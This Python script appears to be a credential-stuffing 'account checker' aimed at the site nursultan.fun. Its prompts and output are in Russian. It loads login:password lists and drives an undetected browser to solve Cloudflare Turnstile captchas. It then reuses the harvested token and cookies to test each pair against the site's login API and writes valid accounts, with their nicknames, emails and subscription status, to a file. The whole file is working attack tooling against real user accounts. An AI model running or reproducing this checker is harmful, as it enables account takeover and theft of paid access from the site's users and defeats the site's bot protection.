import time
import json
import requests
from seleniumbase import SB
from datetime import datetime

LOGIN_URL = "https://nursultan.fun/login"
API_URL = "https://nursultan.fun/api/auth/login"
ACCOUNTS_FILE = "accounts.txt"
DELAY = 6

VALID_FILE = "valid.txt"
INVALID_FILE = "invalid.txt"
ERROR_FILE = "errors.txt"

def load_accounts(file_path):
    accounts = []
    with open(file_path, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if ':' in line:
                login, password = line.split(':', 1)
                accounts.append((login, password))
    return accounts

def has_subscription(user_data):
    buyed_until = user_data.get("buyed_until")
    if not buyed_until or buyed_until == "null" or buyed_until is None:
        return "НЕТ"
    try:
        sub_date = datetime.strptime(buyed_until, "%d.%m.%Y %H:%M")
        now = datetime.now()
        if sub_date > now:
            return f"ДА (до {buyed_until})"
        else:
            return "НЕТ (истекла)"
    except:
        return "НЕТ (ошибка даты)"

def write_valid(login, password, user_data):
    name = user_data.get('name', 'unknown')
    email = user_data.get('email', 'unknown')
    sub = has_subscription(user_data)
    line = f"{login}:{password} | Ник: {name} | Email: {email} | Подписка: {sub}\n"
    with open(VALID_FILE, "a", encoding="utf-8") as f:
        f.write(line)
        f.flush()

def write_invalid(login, message=""):
    line = f"{login} | {message}\n"
    with open(INVALID_FILE, "a", encoding="utf-8") as f:
        f.write(line)
        f.flush()

def write_error(login, error_text):
    line = f"{login} | ERROR: {error_text}\n"
    with open(ERROR_FILE, "a", encoding="utf-8") as f:
        f.write(line)
        f.flush()

def get_token_and_cookies(sb, login, password):
    sb.uc_open_with_reconnect(LOGIN_URL, reconnect_time=10)
    
    try:
        sb.uc_gui_click_captcha()
    except:
        pass

    login_selector = 'input[placeholder="Введите логин или e-mail"]'
    pass_selector = 'input[placeholder="Введите пароль"]'

    sb.wait_for_element_visible(login_selector, timeout=15)
    sb.wait_for_element_visible(pass_selector, timeout=15)

    sb.clear(login_selector)
    sb.type(login_selector, login)
    sb.clear(pass_selector)
    sb.type(pass_selector, password)

    time.sleep(1.5)

    start = time.time()
    while time.time() - start < 12:
        try:
            token = sb.get_attribute('input[name="cf-turnstile-response"]', "value")
            if token and len(token) > 100:
                print("✅ Token получен за {:.1f} сек".format(time.time() - start))
                cookies = {c['name']: c['value'] for c in sb.driver.get_cookies()}
                return token, cookies
        except:
            pass
        time.sleep(0.5)

    print("❌ Token не получен")
    write_error(login, "Token не получен")
    return None, None

def check_via_api(cookies, token, login, password):
    session = requests.Session()
    for name, value in cookies.items():
        session.cookies.set(name, value, domain=".nursultan.fun")

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
        "Referer": LOGIN_URL,
        "Origin": "https://nursultan.fun",
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "application/json, text/plain, */*"
    }

    payload = {
        "name": login,
        "password": password,
        "remember": False,
        "cf-turnstile-response": token
    }

    try:
        r = session.post(API_URL, headers=headers, json=payload, timeout=15)
        print(f"Статус: {r.status_code} | Длина: {len(r.text)}")

        if r.status_code == 200:
            data = r.json()
            if data.get("status") == "success":
                user = data.get("user", {})
                sub_status = has_subscription(user)
                print(f"✅ ВАЛИД: {login}:{password} | {user.get('name')} ({user.get('email')}) | Подписка: {sub_status}")
                write_valid(login, password, user)
                return True

        elif r.status_code == 422:
            try:
                data = r.json()
                msg = data.get('message', '422')
                print(f"❌ НЕВАЛИД: {login} | {msg}")
                write_invalid(login, msg)
            except:
                print("❌ НЕВАЛИД (422)")
                write_invalid(login, "422 no json")
            return False

        else:
            print(f"❌ Ошибка {r.status_code}: {r.text[:300]}")
            write_error(login, f"HTTP {r.status_code}: {r.text[:200]}")
            return False

    except json.JSONDecodeError:
        print(f"❌ Не JSON: {r.text[:300]}")
        write_error(login, f"Не JSON: {r.text[:200]}")
        return False
    except Exception as e:
        print(f"❌ Requests error: {e}")
        write_error(login, str(e))
        return False

def main():
    accounts = load_accounts(ACCOUNTS_FILE)
    if not accounts:
        print("Нет акков!")
        return

    open(VALID_FILE, 'w', encoding="utf-8").close()
    open(INVALID_FILE, 'w', encoding="utf-8").close()
    open(ERROR_FILE, 'w', encoding="utf-8").close()

    print(f"Начинаем проверку {len(accounts)} аккаунтов. Результаты пишутся сразу!\n")

    with SB(uc=True, headless=False, locale_code="ru") as sb:
        for login, pw in accounts:
            print(f"\n🔍 {login}")
            token, cookies = get_token_and_cookies(sb, login, pw)
            if token and cookies:
                check_via_api(cookies, token, login, pw)
            time.sleep(DELAY)

    print(f"\nГотово! Проверь файлы:\n ✅ {VALID_FILE}\n ❌ {INVALID_FILE}\n ⚠️ {ERROR_FILE}")

if __name__ == "__main__":
    main()